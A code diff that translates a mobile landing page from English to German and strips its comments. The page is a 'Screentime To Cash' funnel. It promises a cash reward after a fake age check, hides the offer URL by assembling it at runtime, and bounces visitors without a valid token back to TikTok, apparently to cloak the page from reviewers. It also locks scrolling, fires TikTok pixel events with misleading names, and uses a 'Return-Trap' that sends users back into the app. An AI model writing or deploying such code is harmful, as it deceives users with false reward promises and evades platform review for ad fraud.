@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
@@ -71,9 +71,6 @@ h1.center{text-align:center}
 .load-bar-wrap{width:220px;height:5px;background:var(--sep);border-radius:4px;overflow:hidden;margin:0 0 14px}
 .load-bar{height:100%;width:0;border-radius:4px;background:linear-gradient(90deg,var(--cyan),var(--pink));animation:load-fill 1.5s ease-in-out forwards}
 @keyframes load-fill{0%{width:0}72%{width:78%}100%{width:100%}}
-.app-badge{width:74px;height:74px;border-radius:18px;display:flex;align-items:center;justify-content:center;margin:6px auto 12px}
-.app-name{font-size:17px;font-weight:700}
-.app-id{font-size:12px;color:var(--ink3);margin-top:2px}
 
 .ret-wrap{margin:auto;text-align:center;max-width:280px}
 .bell{width:56px;height:56px;margin:0 auto 22px;color:var(--pink)}
@@ -82,113 +79,107 @@ h1.center{text-align:center}
 </head>
 <body>
 
-<!-- Screen L0: Intro loading -->
+<!-- Screen L0: Intro Ladescreen -->
 <div class="screen active" id="s_loadIntro">
   <div class="load-wrap">
     <div class="ring"></div>
-    <div class="load-title">Loading</div>
+    <div class="load-title">Wird geladen</div>
   </div>
 </div>
 
-<!-- Screen 0: Age intro -->
+<!-- Screen 0: Altersbestätigung -->
 <div class="screen" id="s_ageIntro">
   <div class="spacer"></div>
   <div class="icon-badge ib-pink">
     <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-8a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v8"/><path d="M4 16s.5-1 2-1 2.5 1 4 1 2.5-1 4-1 2.5 1 4 1 2-1 2-1"/><path d="M2 21h20"/><path d="M7 8v2M12 8v2M17 8v2"/><path d="M7 4h.01M12 3h.01M17 4h.01"/></svg>
   </div>
-  <h1 class="center">Confirm your age</h1>
-  <p class="lead center">To participate in our <b class="pink">Screentime To Cash</b> program you must be at least 18 years old. Verify your age to continue.</p>
+  <h1 class="center">Bestätige dein Alter</h1>
+  <p class="lead center">Um an unserem <b class="pink">Screentime To Cash</b> Programm teilzunehmen, musst du mindestens 18 Jahre alt sein. Bestätige dein Alter um fortzufahren.</p>
   <div class="spacer"></div>
-  <button class="btn btn-primary" data-next="s_birthday" data-ev="ViewContent">Continue</button>
+  <button class="btn btn-primary" data-next="s_birthday" data-ev="ViewContent">Weiter</button>
 </div>
 
-<!-- Screen 1: Birthday (3 wheels) -->
+<!-- Screen 1: Geburtstag (3 Wheels) -->
 <div class="screen" id="s_birthday">
   <div style="height:8px"></div>
-  <h1>When's your birthday?</h1>
-  <p class="lead">We may automatically verify the age you input against your account.</p>
+  <h1>Wann hast du Geburtstag?</h1>
+  <p class="lead">Wir gleichen dein angegebenes Alter möglicherweise automatisch mit deinem Konto ab.</p>
   <div class="wheels">
     <div class="wheel-col" id="wMonth"><div class="w-mask"></div><div class="w-hl"></div><div class="w-track"></div></div>
     <div class="wheel-col narrow" id="wDay"><div class="w-mask"></div><div class="w-hl"></div><div class="w-track"></div></div>
     <div class="wheel-col narrow" id="wYear"><div class="w-mask"></div><div class="w-hl"></div><div class="w-track"></div></div>
   </div>
   <div class="spacer"></div>
-  <button class="btn locked" id="bdayBtn">Confirm</button>
+  <button class="btn locked" id="bdayBtn">Bestätigen</button>
 </div>
 
-<!-- Screen L2: Loading after birthday -->
+<!-- Screen L2: Ladescreen nach Geburtstag -->
 <div class="screen" id="s_load2">
   <div class="load-wrap">
     <div class="ring"></div>
     <div class="load-bar-wrap"><div class="load-bar"></div></div>
-    <div class="load-title">Preparing your rewards…</div>
+    <div class="load-title">Deine Belohnungen werden vorbereitet…</div>
   </div>
 </div>
 
-<!-- Screen 2: Congrats -->
+<!-- Screen 2: Glückwunsch -->
 <div class="screen" id="s_congrats">
   <div class="spacer"></div>
   <div class="icon-badge ib-yellow">
     <svg viewBox="0 0 24 24" fill="none" stroke="#F5A623" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5.8 11.3 2 22l10.7-3.79"/><path d="M4 3h.01M22 8h.01M15 2h.01M22 20h.01"/><path d="m22 2-2.24.75a2.9 2.9 0 0 0-1.96 3.12c.1.86-.57 1.63-1.45 1.63h-.38c-.86 0-1.6.6-1.76 1.44L14 10"/><path d="m22 13-.82-.33c-.86-.34-1.82.2-1.98 1.11-.11.7-.72 1.22-1.43 1.22H17"/><path d="m11 2 .33.82c.34.86-.2 1.82-1.11 1.98C9.52 4.9 9 5.52 9 6.23V7"/></svg>
   </div>
-  <h1 class="center">Congratulations!</h1>
-  <p class="lead center">You have been selected for our <b class="pink">Screentime To Cash</b> program.</p>
+  <h1 class="center">Glückwunsch!</h1>
+  <p class="lead center">Du wurdest für unser <b class="pink">Screentime To Cash</b> Programm ausgewählt.</p>
   <div class="numlist">
-    <div class="numrow"><div class="numdot">1</div><span>Confirm your eligibility</span></div>
-    <div class="numrow"><div class="numdot">2</div><span>Download our partner app</span></div>
-    <div class="numrow"><div class="numdot">3</div><span>Claim your cash reward</span></div>
+    <div class="numrow"><div class="numdot">1</div><span>Bestätige deine Berechtigung</span></div>
+    <div class="numrow"><div class="numdot">2</div><span>Lade unsere Partner-App herunter</span></div>
+    <div class="numrow"><div class="numdot">3</div><span>Hole dir deine Belohnung</span></div>
   </div>
   <div class="spacer"></div>
-  <button class="btn btn-primary" data-next="s_final" data-ev="AddToCart">Start Now</button>
+  <button class="btn btn-primary" data-next="s_final" data-ev="AddToCart">Jetzt starten</button>
 </div>
 
-<!-- Screen 3: Final steps -->
+<!-- Screen 3: Letzte Schritte -->
 <div class="screen" id="s_final">
   <div style="height:8px"></div>
   <div class="icon-badge ib-pink">
     <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="m9 15 2 2 4-4"/></svg>
   </div>
-  <h1 class="center">Final Steps</h1>
-  <p class="lead center">Complete these steps to finish your enrollment</p>
+  <h1 class="center">Letzte Schritte</h1>
+  <p class="lead center">Schließe diese Schritte ab um deine Anmeldung abzuschließen</p>
   <div class="steps">
-    <div class="step"><div class="snum">1</div><div class="stxt"><b>Install Partner App</b><small>Download and install the application</small></div></div>
-    <div class="step"><div class="snum">2</div><div class="stxt"><b>Sign Up</b><small>Create your new account</small></div></div>
-    <div class="step"><div class="snum">3</div><div class="stxt"><b>Complete Setup</b><small>Achieve in-app Level 1</small></div></div>
+    <div class="step"><div class="snum">1</div><div class="stxt"><b>Partner-App installieren</b><small>Lade die App herunter und installiere sie</small></div></div>
+    <div class="step"><div class="snum">2</div><div class="stxt"><b>Registrieren</b><small>Erstelle dein neues Konto</small></div></div>
+    <div class="step"><div class="snum">3</div><div class="stxt"><b>Setup abschließen</b><small>Erreiche Level 1 in der App</small></div></div>
   </div>
   <div class="spacer"></div>
-  <button class="btn btn-primary" id="readyBtn" data-ev="InitiateCheckout">I'm Ready</button>
+  <button class="btn btn-primary" id="readyBtn" data-ev="InitiateCheckout">Ich bin bereit</button>
 </div>
 
-<!-- Screen 4: App store loading -->
+<!-- Screen 4: App Store Ladescreen -->
 <div class="screen" id="s_store">
   <div class="load-wrap">
     <div class="ring"></div>
-    <div class="load-title">Opening App Store…</div>
+    <div class="load-title">App Store wird geöffnet…</div>
   </div>
 </div>
 
-<!-- Screen 5: Return trap -->
+<!-- Screen 5: Return-Trap -->
 <div class="screen dark" id="s_return">
   <div class="ret-wrap">
     <div class="bell">
       <svg viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
     </div>
-    <p>You will receive a notification once you have been enrolled.</p>
+    <p>Du erhältst eine Benachrichtigung sobald du angemeldet wurdest.</p>
   </div>
 </div>
 
 <script>
 (function(){
-  /* ========================================================
-   *  FUNNEL — Screens, Tracking, Offer-Redirect
-   *  Gleicher _K wie in der Gate-Seite!
-   * ======================================================== */
   var _K='stc2026';
 
-  // --- Hash (muss identisch zur Gate sein) ---
   function _dh(s){var h=5381;for(var i=0;i<s.length;i++)h=((h<<5)+h)+s.charCodeAt(i);return h>>>0;}
 
-  // --- URL-Params ---
   var p=new URLSearchParams(location.search);
   var _preview=p.get('preview');
   var _keyAccess=p.get('key')===_K;
@@ -197,7 +188,6 @@ h1.center{text-align:center}
   var content_id=p.get('cid')||'default';
   var tok=p.get('t')||'';
 
-  // --- Token-Validierung (30s Fenster) ---
   var tokenValid=false;
   if(tok){
     try{
@@ -208,10 +198,8 @@ h1.center{text-align:center}
     }catch(e){}
   }
 
-  // --- Zugang erlaubt? ---
   var allowed=tokenValid||_keyAccess||_preview;
 
-  // --- Bounce ---
   function bounce(){
     try{window.location.href='snssdk1233://feed';}catch(e){}
     setTimeout(function(){window.location.href='/app/lp/';},600);
@@ -219,7 +207,6 @@ h1.center{text-align:center}
 
   if(!allowed){bounce();return;}
 
-  // --- Scroll/Swipe Lock (nicht im Preview) ---
   if(!_preview){
     ['touchmove','gesturestart','gesturechange','gestureend','wheel','mousewheel','DOMMouseScroll','dragstart','selectstart'].forEach(function(e){
       document.addEventListener(e,function(ev){
@@ -228,7 +215,7 @@ h1.center{text-align:center}
     });
   }
 
-  // --- TikTok Pixel (nur hier, nicht in der Gate) ---
+  // --- TikTok Pixel ---
   (function(w,d,t){
     w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
     ttq.load('DARBND3C77UA02BT2DK0');
@@ -236,20 +223,17 @@ h1.center{text-align:center}
     try{ttq.identify({external_id:sub_id});}catch(e){}
   })(window,document,'ttq');
 
-  // --- Tracking-Helper ---
   function fire(ev){
     if(!ev) return;
     try{ttq.track(ev,{content_id:content_id,content_type:'funnel',description:sub_id});}catch(e){}
   }
 
-  // --- Screen-Navigation ---
   function show(id){
     document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('active');});
     var el=document.getElementById(id);
     if(el) el.classList.add('active');
   }
 
-  // Buttons mit data-next
   document.querySelectorAll('[data-next]').forEach(function(btn){
     btn.addEventListener('click',function(){
       if(btn.classList.contains('locked')) return;
@@ -258,7 +242,7 @@ h1.center{text-align:center}
     });
   });
 
-  // --- Wheel-Factory ---
+  // --- Wheels ---
   var ITEM=44,VH=180,CTR=VH/2-ITEM/2;
   function makeWheel(colId,items,defIdx,onChange){
     var col=document.getElementById(colId);
@@ -306,9 +290,8 @@ h1.center{text-align:center}
     return{get:function(){return items[sel];},touched:function(){return touched;}};
   }
 
-  var MONTHS=['January','February','March','April','May','June','July','August','September','October','November','December'];
+  var MONTHS=['Januar','Februar','März','April','Mai','Juni','Juli','August','September','Oktober','November','Dezember'];
   var DAYS=[];for(var dd=1;dd<=31;dd++)DAYS.push(dd);
-  // 18+ → starte bei 2008 (18 Jahre vor 2026)
   var CUR=2026;
   var YEARS=[];for(var yy=CUR-18;yy>=1940;yy--)YEARS.push(yy);
 
@@ -323,7 +306,6 @@ h1.center{text-align:center}
   var wD=makeWheel('wDay',DAYS,16,onWheelChange);
   var wY=makeWheel('wYear',YEARS,8,onWheelChange);
 
-  // Birthday-Confirm → Loading → Congrats
   document.getElementById('bdayBtn').addEventListener('click',function(){
     if(this.classList.contains('locked'))return;
     fire('Search');
@@ -331,7 +313,6 @@ h1.center{text-align:center}
     setTimeout(function(){show('s_congrats');},1500);
   });
 
-  // --- Age-Bucket (korrigiert: lueckenlos) ---
   function getBucket(){
     var age=CUR-(wY.get()||2000);
     if(age<21) return'18_20';
@@ -342,7 +323,6 @@ h1.center{text-align:center}
     return'51_plus';
   }
 
-  // --- Offer-URL (obfuskiert, zur Laufzeit zusammengebaut) ---
   function buildOffer(){
     var h='stw4'+'c9hx'+'.com';
     var path='/874'+'BJD/25'+'S9S6X/';
@@ -354,13 +334,11 @@ h1.center{text-align:center}
     return url;
   }
 
-  // --- "I'm Ready" → Redirect + Return-Trap ---
   var redirected=false;
   document.getElementById('readyBtn').addEventListener('click',function(){
     fire('InitiateCheckout');
     show('s_store');
 
-    // Return-Trap: alle 4 Events
     function armReturn(){
       if(redirected){window.location.href='snssdk1233://feed';}
     }
@@ -370,12 +348,10 @@ h1.center{text-align:center}
     window.addEventListener('focus',armReturn);
     window.addEventListener('pagehide',function(){redirected=true;});
     window.addEventListener('blur',function(){
-      // blur nach redirect → flag setzen
       if(redirected) return;
       setTimeout(function(){redirected=true;},200);
     });
 
-    // Redirect-Timer → Offer
     setTimeout(function(){
       redirected=true;
       show('s_return');
@@ -384,17 +360,17 @@ h1.center{text-align:center}
     },1700);
   });
 
-  // --- Preview-Modus (alle Screens gestackt) ---
+  // --- Preview-Modus ---
   if(_preview){
     var labels={
-      s_loadIntro:'0 · Intro Loading',
-      s_ageIntro:'1 · Age Gate (18+)',
-      s_birthday:'2 · Birthday Wheel',
-      s_load2:'2b · Loading',
-      s_congrats:'3 · Congrats',
-      s_final:'4 · Final Steps',
+      s_loadIntro:'0 · Ladescreen',
+      s_ageIntro:'1 · Altersbestätigung (18+)',
+      s_birthday:'2 · Geburtstag Wheel',
+      s_load2:'2b · Ladescreen',
+      s_congrats:'3 · Glückwunsch',
+      s_final:'4 · Letzte Schritte',
       s_store:'5 · App Store',
-      s_return:'6 · Return Trap'
+      s_return:'6 · Return-Trap'
     };
     try{document.body.style.cssText='overflow:auto;height:auto;touch-action:auto;background:#e5e5e7';}catch(e){}
     document.querySelectorAll('.screen').forEach(function(s){
@@ -415,7 +391,6 @@ h1.center{text-align:center}
     return;
   }
 
-  // --- Flow starten ---
   setTimeout(function(){show('s_ageIntro');},1700);
 
 })();
